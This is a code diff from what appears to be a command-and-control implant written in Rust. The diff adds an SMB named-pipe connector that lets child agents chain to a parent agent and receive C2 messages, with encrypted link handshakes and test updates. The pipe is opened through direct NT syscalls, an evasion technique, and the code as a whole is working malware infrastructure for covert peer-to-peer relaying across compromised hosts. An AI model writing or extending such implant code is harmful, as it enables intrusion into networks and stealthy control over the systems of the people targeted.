@@ -388,8 +388,62 @@ impl P2pMesh {
                 }
             }
             "smb" => {
-                // SMB client-side connector is not yet implemented.
-                anyhow::bail!("SMB P2P client-side connector not yet implemented");
+                #[cfg(all(windows, feature = "smb-pipe-transport"))]
+                {
+                    // Connect to the parent's named pipe (blocking NT I/O
+                    // on spawn_blocking, then async-wrapped).
+                    let addr_owned = addr.to_string();
+                    let agent_id = self.agent_id.clone();
+                    let result = tokio::task::spawn_blocking(move || {
+                        nt_pipe_server::connect(&addr_owned, &agent_id, link_id)
+                    })
+                    .await
+                    .map_err(|e| anyhow::anyhow!("p2p-pipe connect task panicked: {e}"))??;
+
+                    match result {
+                        nt_pipe_server::ConnectResult::Connected(mut link) => {
+                            // Transition from Linking → Connected is already
+                            // done in nt_pipe_server::connect, but verify.
+                            if link.state != LinkState::Connected {
+                                link.transition(LinkState::Connected)
+                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
+                            }
+                            let link_id = link.link_id;
+                            self.insert_link(link);
+
+                            // Spawn the child-relay task.
+                            spawn_child_relay(link_id, mesh_arc.clone(), outbound_tx);
+
+                            // Spawn the parent reader task to receive C2
+                            // messages from the parent link.
+                            if let Some(ref inbound_tx) = self.inbound_tx {
+                                spawn_parent_reader(mesh_arc, inbound_tx.clone());
+                            }
+
+                            log::info!(
+                                "P2P: connected to parent at {addr} via SMB, link_id={:#010X}",
+                                link_id
+                            );
+                            Ok(link_id)
+                        }
+                        nt_pipe_server::ConnectResult::Rejected {
+                            reason,
+                            description,
+                        } => {
+                            anyhow::bail!(
+                                "parent at {addr} rejected link: {description} (reason={reason:#04X})"
+                            );
+                        }
+                    }
+                }
+                #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
+                {
+                    let _ = (addr, outbound_tx, mesh_arc, link_id);
+                    anyhow::bail!(
+                        "SMB P2P transport not compiled in \
+                         (enable feature smb-pipe-transport on Windows)"
+                    );
+                }
             }
             other => {
                 anyhow::bail!("unknown P2P transport: {other:?} (expected \"tcp\" or \"smb\")");
@@ -2204,8 +2258,248 @@ pub mod nt_pipe_server {
         Ok(())
     }
 
+    // ── NT client-side constants ──────────────────────────────────────
+
+    /// NTSTATUS: The object name was not found (pipe does not exist).
+    const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC0000034_i32;
+    /// NTSTATUS: All pipe instances are busy.
+    const STATUS_INSTANCE_NOT_AVAILABLE: i32 = 0xC00000AB_i32;
+    /// NTSTATUS: Named pipe is busy (no instances available for connection).
+    const STATUS_PIPE_BUSY: i32 = 0xC00000AE_i32;
+
+    const FILE_SHARE_READ: u32 = 0x00000001;
+    const FILE_SHARE_WRITE: u32 = 0x00000002;
+    const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
+
+    /// Maximum number of connection retries on pipe-busy errors.
+    const MAX_CONNECT_RETRIES: u32 = 5;
+    /// Delay between connection retries (milliseconds).
+    const CONNECT_RETRY_DELAY_MS: u64 = 1000;
+
+    // ── Client-side pipe opener ───────────────────────────────────────
+
+    /// Open a named pipe via `NtOpenFile` (client-side connect).
+    ///
+    /// Returns the raw NTSTATUS on failure so the caller can decide
+    /// whether to retry.  On success, returns the pipe handle.
+    unsafe fn open_pipe_raw(
+        pipe_path: &str,
+    ) -> std::result::Result<*mut std::ffi::c_void, i32> {
+        // Convert to NT path:
+        //   Win32  \\.\pipe\name  →  \??\pipe\name
+        //   NT     \??\pipe\name  →  unchanged
+        //   bare   name           →  \??\pipe\name
+        let nt_path_str = if pipe_path.starts_with(r"\\") {
+            format!(r"\??\{}", &pipe_path[2..])
+        } else if pipe_path.starts_with(r"\??\") {
+            pipe_path.to_string()
+        } else {
+            format!(r"\??\pipe\{}", pipe_path)
+        };
+        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+
+        let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+        init_unicode_string(&mut name_str, &nt_wide);
+
+        let mut obj_attrs: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attrs.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        obj_attrs.ObjectName = &mut name_str;
+        obj_attrs.Attributes = OBJ_CASE_INSENSITIVE;
+
+        let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
+        let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
+
+        let status = nt_syscall::syscall!(
+            "NtOpenFile",
+            &mut handle as *mut _ as u64,                 // FileHandle
+            (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
+            &mut obj_attrs as *mut _ as u64,              // ObjectAttributes
+            &mut iosb as *mut _ as u64,                   // IoStatusBlock
+            (FILE_SHARE_READ | FILE_SHARE_WRITE) as u64,  // ShareAccess
+            FILE_SYNCHRONOUS_IO_NONALERT as u64,          // OpenOptions
+        )
+        .map_err(|e| anyhow!("nt_syscall resolution for NtOpenFile: {e}"))?;
+
+        if status < 0 {
+            return Err(status);
+        }
+        Ok(handle)
+    }
+
+    /// Open a named pipe with retry on transient busy errors.
+    ///
+    /// Retries up to [`MAX_CONNECT_RETRIES`] times with a
+    /// [`CONNECT_RETRY_DELAY_MS`] delay between attempts when the pipe
+    /// returns `STATUS_PIPE_BUSY` or `STATUS_INSTANCE_NOT_AVAILABLE`.
+    ///
+    /// `STATUS_OBJECT_NAME_NOT_FOUND` is returned immediately as
+    /// "parent not listening".
+    fn open_pipe_with_retry(pipe_path: &str) -> Result<*mut std::ffi::c_void> {
+        for attempt in 0..MAX_CONNECT_RETRIES {
+            match unsafe { open_pipe_raw(pipe_path) } {
+                Ok(h) => return Ok(h),
+                Err(status) if status == STATUS_PIPE_BUSY || status == STATUS_INSTANCE_NOT_AVAILABLE => {
+                    if attempt + 1 < MAX_CONNECT_RETRIES {
+                        info!(
+                            "p2p-pipe: pipe busy (NTSTATUS {:#010X}), retrying ({}/{}) in {}ms",
+                            status as u32,
+                            attempt + 1,
+                            MAX_CONNECT_RETRIES,
+                            CONNECT_RETRY_DELAY_MS,
+                        );
+                        std::thread::sleep(std::time::Duration::from_millis(CONNECT_RETRY_DELAY_MS));
+                        continue;
+                    }
+                    return Err(anyhow!(
+                        "NtOpenFile: pipe busy after {} retries for '{pipe_path}' \
+                         (last NTSTATUS {:#010X})",
+                        MAX_CONNECT_RETRIES,
+                        status as u32,
+                    ));
+                }
+                Err(STATUS_OBJECT_NAME_NOT_FOUND) => {
+                    return Err(anyhow!(
+                        "SMB P2P parent not listening: pipe '{pipe_path}' does not exist \
+                         (STATUS_OBJECT_NAME_NOT_FOUND)"
+                    ));
+                }
+                Err(status) => {
+                    return Err(anyhow!(
+                        "NtOpenFile failed for '{pipe_path}': NTSTATUS {:#010X}",
+                        status as u32
+                    ));
+                }
+            }
+        }
+        unreachable!()
+    }
+
+    // ── Client connector (child → parent) ────────────────────────────
+
+    /// Result of an SMB pipe P2P connection attempt from the child side.
+    #[derive(Debug)]
+    pub enum ConnectResult {
+        /// The link was established successfully.
+        Connected(P2pLink),
+        /// The parent rejected the link.
+        Rejected {
+            /// Reason code from the `LinkReject` frame.
+            reason: u8,
+            /// Human-readable description.
+            description: String,
+        },
+    }
+
+    /// Connect to a parent agent's SMB named pipe and perform the
+    /// link handshake.
+    ///
+    /// 1. Open the named pipe via `NtOpenFile` (retry on pipe busy).
+    /// 2. Send `LinkRequest` with our `agent_id` and X25519 public key.
+    /// 3. Read the response: `LinkAccept` → complete ECDH → `Connected`;
+    ///    `LinkReject` → report failure.
+    ///
+    /// The `pipe_addr` parameter can be:
+    /// - A Win32 pipe path: `\\.\pipe\<name>`
+    /// - An NT path: `\??\pipe\<name>`
+    /// - A bare pipe name: `<name>` (will be prefixed with `\??\pipe\`)
+    ///
+    /// This is a **blocking** function (NT pipe I/O is synchronous).
+    pub fn connect(
+        pipe_addr: &str,
+        agent_id: &str,
+        link_id: u32,
+    ) -> Result<ConnectResult> {
+        info!("p2p-pipe: connecting to parent at '{pipe_addr}'");
+
+        // Open the pipe with retry logic.
+        let handle = open_pipe_with_retry(pipe_addr)?;
+
+        // Wrap in NtPipeHandle for frame I/O.
+        let pipe = std::sync::Arc::new(NtPipeHandle::new(handle));
+
+        info!("p2p-pipe: pipe opened successfully");
+
+        // 1. Generate our X25519 ephemeral keypair.
+        let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
+        let our_public = PublicKey::from(&our_secret);
+
+        // 2. Build and send LinkRequest.
+        let req_payload = build_link_request_payload(agent_id, our_public.as_bytes());
+        let req_frame = P2pFrame {
+            frame_type: P2pFrameType::LinkRequest,
+            link_id,
+            payload_len: req_payload.len() as u32,
+            payload: req_payload,
+        };
+        pipe.write_frame(&req_frame)?;
+
+        info!("p2p-pipe: LinkRequest sent, link_id={:#010X}", link_id);
+
+        // 3. Read response frame.
+        let resp_frame = pipe.read_frame()?;
+
+        match resp_frame.frame_type {
+            P2pFrameType::LinkAccept => {
+                // 4. Parse parent's X25519 public key.
+                if resp_frame.payload.len() < 32 {
+                    return Err(anyhow!(
+                        "LinkAccept payload too short: {} < 32",
+                        resp_frame.payload.len()
+                    ));
+                }
+                let mut parent_pubkey = [0u8; 32];
+                parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);
+
+                // 5. Complete ECDH.
+                let peer_public = PublicKey::from(parent_pubkey);
+                let shared = our_secret.diffie_hellman(&peer_public);
+
+                // 6. Derive per-link key.
+                let link_key = derive_link_key(shared.as_bytes());
+
+                info!(
+                    "p2p-pipe: link established with parent at '{pipe_addr}', link_id={:#010X}",
+                    link_id
+                );
+
+                // 7. Build the P2pLink.
+                let mut link = P2pLink::new(
+                    link_id,
+                    LinkRole::Parent,
+                    P2pTransport::SmbPipe(pipe),
+                    pipe_addr.to_string(), // peer addr as identifier
+                    link_key,
+                );
+                link.transition(LinkState::Connected)
+                    .map_err(|e| anyhow!("link state transition failed: {e}"))?;
+
+                Ok(ConnectResult::Connected(link))
+            }
+
+            P2pFrameType::LinkReject => {
+                let reason = resp_frame.payload.first().copied().unwrap_or(0xFF);
+                let description = if reason == REJECT_CAPACITY_FULL {
+                    "parent at capacity".to_string()
+                } else {
+                    format!("rejected with reason code {reason:#04X}")
+                };
+
+                warn!(
+                    "p2p-pipe: link rejected by parent at '{pipe_addr}': {description}"
+                );
+
+                Ok(ConnectResult::Rejected { reason, description })
+            }
+
+            other => Err(anyhow!(
+                "unexpected response frame type: {:?}",
+                other
+            )),
+        }
+    }
+
     // Re-use shared handshake helpers from parent scope.
-    use super::{derive_link_key, parse_link_request, build_link_accept_payload, build_link_reject_payload};
+    use super::{derive_link_key, parse_link_request, build_link_request_payload, build_link_accept_payload, build_link_reject_payload};
 
     // ── P2P pipe listener ────────────────────────────────────────────────
 
@@ -2536,6 +2830,25 @@ pub mod nt_pipe_server {
             ""
         }
     }
+
+    /// Stub connect result — mirrors the Windows variant's API.
+    #[derive(Debug)]
+    pub enum ConnectResult {
+        Connected(super::P2pLink),
+        Rejected { reason: u8, description: String },
+    }
+
+    /// Stub connector — always returns an error.
+    pub fn connect(
+        _pipe_addr: &str,
+        _agent_id: &str,
+        _link_id: u32,
+    ) -> anyhow::Result<ConnectResult> {
+        Err(anyhow::anyhow!(
+            "p2p-pipe: SMB named-pipe connector is only available on Windows \
+             with the `smb-pipe-transport` feature"
+        ))
+    }
 }
 
 #[cfg(test)]
@@ -2546,12 +2859,34 @@ mod tests {
         [0xAA; 32]
     }
 
+    /// Create a dummy `P2pTransport::TcpStream` for tests.
+    ///
+    /// When the `p2p-tcp` feature is enabled the variant carries an
+    /// `Arc<Mutex<TcpP2pHandle>>`, which requires a real TCP stream.
+    /// We spin up a transient loopback listener and connect to it.
+    #[cfg(feature = "p2p-tcp")]
+    fn dummy_tcp_transport() -> P2pTransport {
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        rt.block_on(async {
+            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+            let addr = listener.local_addr().unwrap();
+            let client = tokio::net::TcpStream::connect(addr).await.unwrap();
+            let handle = tcp_transport::TcpP2pHandle::new(client);
+            P2pTransport::TcpStream(std::sync::Arc::new(tokio::sync::Mutex::new(handle)))
+        })
+    }
+
+    #[cfg(not(feature = "p2p-tcp"))]
+    fn dummy_tcp_transport() -> P2pTransport {
+        P2pTransport::TcpStream
+    }
+
     #[test]
     fn link_state_transitions_valid() {
         let mut link = P2pLink::new(
             1,
             LinkRole::Child,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "peer".to_string(),
             test_secret(),
         );
@@ -2572,7 +2907,7 @@ mod tests {
         let mut link = P2pLink::new(
             1,
             LinkRole::Child,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "peer".to_string(),
             test_secret(),
         );
@@ -2585,13 +2920,14 @@ mod tests {
     fn mesh_insert_and_remove() {
         let mut mesh = P2pMesh::new("agent-1".to_string(), 4);
 
-        let parent = P2pLink::new(
+        let mut parent = P2pLink::new(
             10,
             LinkRole::Parent,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "server".to_string(),
             test_secret(),
         );
+        parent.transition(LinkState::Connected).unwrap();
         mesh.insert_link(parent);
         assert!(mesh.parent_link_id == Some(10));
         assert!(mesh.has_connected_parent());
@@ -2599,7 +2935,7 @@ mod tests {
         let child = P2pLink::new(
             20,
             LinkRole::Child,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "child-1".to_string(),
             test_secret(),
         );
@@ -2620,7 +2956,7 @@ mod tests {
         mesh.insert_link(P2pLink::new(
             1,
             LinkRole::Child,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "c1".to_string(),
             test_secret(),
         ));
@@ -2629,7 +2965,7 @@ mod tests {
         mesh.insert_link(P2pLink::new(
             2,
             LinkRole::Child,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "c2".to_string(),
             test_secret(),
         ));
@@ -2641,7 +2977,7 @@ mod tests {
         let mut link = P2pLink::new(
             1,
             LinkRole::Child,
-            P2pTransport::TcpStream,
+            dummy_tcp_transport(),
             "peer".to_string(),
             test_secret(),
         );
